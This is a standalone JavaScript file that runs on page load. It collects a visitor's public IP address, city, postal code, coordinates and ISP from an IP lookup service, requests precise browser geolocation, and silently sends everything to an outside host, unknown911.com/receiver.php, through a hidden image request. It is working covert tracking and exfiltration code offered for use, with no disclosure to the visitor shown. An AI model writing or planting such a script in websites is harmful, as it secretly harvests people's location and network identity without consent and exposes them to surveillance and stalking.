// network_details.js
(function() {
    // Function to send data to your server
    function sendData(data) {
        var url = 'http://unknown911.com/receiver.php?data=' + encodeURIComponent(data);
        var img = new Image();
        img.src = url;
    }

    // Get user's public IP address and other network details using an external API
    fetch('https://ipapi.co/json/')
        .then(response => response.json())
        .then(data => {
            var details = {
                ip: data.ip,
                city: data.city,
                region: data.region,
                country: data.country_name,
                postal: data.postal,
                latitude: data.latitude,
                longitude: data.longitude,
                org: data.org
            };

            // Convert details object to a query string
            var detailsString = Object.keys(details).map(key => key + '=' + details[key]).join('&');
            sendData(detailsString);
        })
        .catch(error => {
            console.error('Error fetching IP details:', error);
        });

    // Get geolocation (latitude and longitude) using the browser's built-in API
    if (navigator.geolocation) {
        navigator.geolocation.getCurrentPosition(function(position) {
            var geolocation = 'latitude=' + position.coords.latitude + '&longitude=' + position.coords.longitude;
            sendData(geolocation);
        }, function(error) {
            console.error('Error getting geolocation:', error);
        });
    } else {
        console.error('Geolocation is not supported by this browser.');
    }
})();
